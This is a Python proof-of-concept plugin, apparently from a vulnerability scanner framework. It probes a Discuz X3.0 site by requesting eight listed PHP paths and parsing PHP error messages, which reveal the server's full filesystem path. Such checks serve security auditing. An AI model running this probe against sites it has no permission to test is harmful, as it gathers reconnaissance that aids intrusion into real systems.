#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'knthony' 
#_name_ = ' Discuz X3.0 full Path Disclosure Vulnerability'
#_Refer_ = 'http://www.beebeeto.com/pdb/poc-2015-0114/'
import re
def assign(service, arg): 
    if service == "discuz": 
        return True, arg 



def audit(arg):
    wordlist = [
            'api/addons/zendcheck.php',
            'api/addons/zendcheck52.php',
            'api/addons/zendcheck53.php',
            'source/plugin/mobile/api/1/index.php',
            'source/plugin/mobile/extends/module/dz_digest.php',
            'source/plugin/mobile/extends/module/dz_newpic.php',
            'source/plugin/mobile/extends/module/dz_newreply.php',
            'source/plugin/mobile/extends/module/dz_newthread.php',
        ]
    for payload in wordlist:
        verify_url = arg + payload
        pathinfo = re.compile(r' in <b>(.*)</b> on line')
        code, body,res, errcode, _ = curl.curl2(verify_url)
        match = pathinfo.findall(body)
        if code == 200 and match:
            security_info('Discuz X3.0 full Path Disclosure Vulnerability',verify_url)



if __name__ == '__main__': 
    from dummy import * 
    audit(assign('discuz', 'http://www.example.com/')[1])

